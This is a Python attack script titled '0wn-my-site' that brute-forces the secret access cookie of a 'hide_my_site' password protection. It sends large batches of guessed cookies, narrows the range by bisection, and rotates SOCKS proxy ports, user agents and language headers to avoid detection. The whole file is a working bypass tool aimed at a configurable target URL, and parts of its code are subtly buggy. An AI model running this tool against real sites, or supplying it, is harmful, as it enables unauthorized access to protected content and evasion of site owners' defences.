#!/usr/bin/python3
# by antipatico
# v0.2.2
import socks
import socket
import urllib
import sys
import random
import time
from sockshandler import SocksiPyHandler


### SETTINGS ###

# Number of cookies tested per request
GAP = 200
# Skip the first X cookies
SKIP = 0
# The target's URL
TARGET =  "http://your.target.here"
# If true a random proxy port will used for every connection
USE_PROXY = False
# The proxy host
PROXY_HOST = '127.0.0.1'
# A list of ports
PROXY_PORTS = list(range(9150,9190))
# The delay in seconds between every request
TIMEOUT = 0.3
DEBUG = False

# Language Codes (randomized every request)
lc = ["en","en-US"]

# User Agents (randomized every request)
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1"]


def debug(message):
    if DEBUG:
        print("[DEBUG] %s" % message)

def change_proxy():
    if USE_PROXY and PROXY_PORTS:        
        print("Changing proxy..")
        port = random.choice(PROXY_PORTS)
        debug("Using proxy port #%d" % port)
        socks_handler = SocksiPyHandler(socks.PROXY_TYPE_SOCKS5, PROXY_HOST,port)
        opener = urllib.request.build_opener(socks_handler)
        urllib.request.install_opener(opener)
        return port
    return None


def get_random_lc(lc):
    return random.choice(lc)


def get_random_ua():
    _ua = random.choice(ua)
    debug('Using ua "%s"' % _ua)
    return _ua

  
def get_accept_language():
    i = random.randrange(1, len(lc)+1)
    debug("Selecting %i languages" %i)
    _lc = lc[:]
    languages = ""
    while i > 0:
        if languages is not "":
            languages += ","
        new = random.choice(_lc)
        _lc.remove(new)
        languages += new
        i = i-1
    debug("Using accept-language: %s" % languages)
    return languages


def generate_cookies(start, end):
    cookies=""
    for i in range(start,end-1):
        cookies += "hide_my_site-access%d=1; "%i
    return cookies + "hide_my_site-access%d=1" %(end-1)


def check_base(cookies):
    http_request = urllib.request.Request(TARGET)
    http_request.add_header('user-agent', get_random_ua())
    http_request.add_header('accept', 'text/html')
    http_request.add_header('accept-encoding', 'deflate')
    http_request.add_header('accept-language', get_accept_language())
    #http_request.add_header('connection', 'keep-alive') # Doesn't work :<
    http_request.add_header('cookie', cookies)
    http_request.add_header('cache-control', 'max-age=0')
    print("Sending the request")
    response = urllib.request.urlopen(http_request)
    html = str(response.read())
    response.close()
    del http_request
    return "hwsp_motech" not in html


def check_range(start, end):
    if start >= end:
        raise Exception("end must be > than start")

    print("Preparing range %d - %d.." % (i, i+GAP))
    return check_base(generate_cookies(start,end))


def final_step(start, end):
    for i in range(start,end):
        print("Preparing %d.." % i)
        if check_base(generate_cookies(i,i)):
            print('Found!\nThe login cookie is "hide_my_site-access%d=1"!' % i)
            sys.exit(0)

if __name__ == "__main__":
    print("0wn-my-site v0.2.2 by antipatico")
    random.seed()
    print('Starting attack on "%s"..\n' % TARGET)
    port = change_proxy()


    i=1+SKIP
    while i < 99999:
        try:
            if(GAP <= 10):
                print("\n/!\\ Entering the final stage! /!\\")
                final_step(i, i+(2*GAP)+1)
            elif(check_range(i, i+GAP)):
                print("/!\\ Range %d - %d is working! /!\\" % (i, i+GAP))
                GAP = int(GAP/2)
            else:
                i = i + GAP
        except urllib.error.HTTPError as e:
            if(e.code == 400):
                print('The server returned an "HTTP 400: Bad Request", try setting a smaller GAP.')
                print('Aborting.')
                sys.exit(1)
            print(e.message)
            sys.exit(1)
        except urllib.error.URLError as e:
            print("Connection error.")
            if port and PROXY_PORTS:
                print("Removing the proxy port #%d from the list.." % port)
                PROXY_PORTS.remove(port)
                
            if USE_PROXY and not PROXY_PORTS:
                print("Seems like there isn't a single proxy working.")
                print("Aborting.")
                sys.exit(2)
            print("Trying again..")

        print()
        port = change_proxy()
        time.sleep(TIMEOUT)  
